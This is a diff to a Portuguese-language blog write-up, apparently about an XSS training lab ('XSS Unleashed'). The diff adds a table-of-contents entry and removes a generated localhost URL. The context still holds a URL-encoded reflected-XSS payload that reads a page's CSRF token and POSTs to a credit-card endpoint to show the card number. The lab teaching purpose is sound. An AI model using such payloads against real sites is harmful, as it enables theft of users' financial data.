@@ -12,6 +12,7 @@ alt: "xss-unleashed"
 ![XSS Unleashed](/img/posts/xss_unleashed.png)
 
 - [Introdução](#introdução)
+- [Motivação](#motivação)
 - [Objetivo](#objetivo)
 - [Obtendo o Projeto](#obtendo-o-projeto)
 - [Resolução das Tasks](#resolução-das-tasks)
@@ -1215,9 +1216,6 @@ Convertendo para *URL Encode*:
 %3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Avar%20token%20%3D%20document.getElementById%28%22csrf_token%22%29.value%3B%0Areq.open%28%22POST%22%2C%20%22%2Ftask-17%2FcreditCard%2F%22%2C%20true%29%3B%0Areq.setRequestHeader%28%22Content-Type%22%2C%20%22application%2Fx-www-form-urlencoded%22%29%3B%0Areq.send%28%22user%3Dh41stur%26csrf_token%3D%22%2Btoken%29%3B%0A%3C%2Fscript%3E
 ```
 
-Gerando a seguinte URL:
-
-- [http://localhost/task-17/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Avar%20token%20%3D%20document.getElementById%28%22csrf_token%22%29.value%3B%0Areq.open%28%22POST%22%2C%20%22%2Ftask-17%2FcreditCard%2F%22%2C%20true%29%3B%0Areq.setRequestHeader%28%22Content-Type%22%2C%20%22application%2Fx-www-form-urlencoded%22%29%3B%0Areq.send%28%22user%3Dh41stur%26csrf_token%3D%22%2Btoken%29%3B%0A%3C%2Fscript%3E](localhost/task-17/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Avar%20token%20%3D%20document.getElementById%28%22csrf_token%22%29.value%3B%0Areq.open%28%22POST%22%2C%20%22%2Ftask-17%2FcreditCard%2F%22%2C%20true%29%3B%0Areq.setRequestHeader%28%22Content-Type%22%2C%20%22application%2Fx-www-form-urlencoded%22%29%3B%0Areq.send%28%22user%3Dh41stur%26csrf_token%3D%22%2Btoken%29%3B%0A%3C%2Fscript%3E)
 
 Ao acessar a URL, temos o número do cartão impresso na tela.
 
